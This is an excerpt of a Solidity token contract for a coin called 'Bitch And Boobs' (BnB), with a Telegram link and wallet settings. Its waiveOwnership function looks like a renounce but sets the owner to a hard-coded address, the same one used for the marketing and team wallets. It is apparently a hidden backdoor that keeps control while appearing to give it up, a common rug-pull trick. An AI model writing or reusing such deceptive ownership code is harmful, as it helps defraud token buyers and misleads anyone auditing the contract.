...
/**
Telegram : https://t.me/BitchandBoobs
*/
...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        ...
        _owner = address(0x6860032BF7Ed6cFdCdDa5Fc9868DA3f649c7A09B);
    }
...
contract BitchAndBoobs is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "Bitch And Boobs";
    string private _symbol = "BnB";
    uint8 private _decimals = 9;

    address payable private marketingWalletAddress = payable(0x6860032BF7Ed6cFdCdDa5Fc9868DA3f649c7A09B);
    address payable private teamWalletAddress = payable(0x6860032BF7Ed6cFdCdDa5Fc9868DA3f649c7A09B);
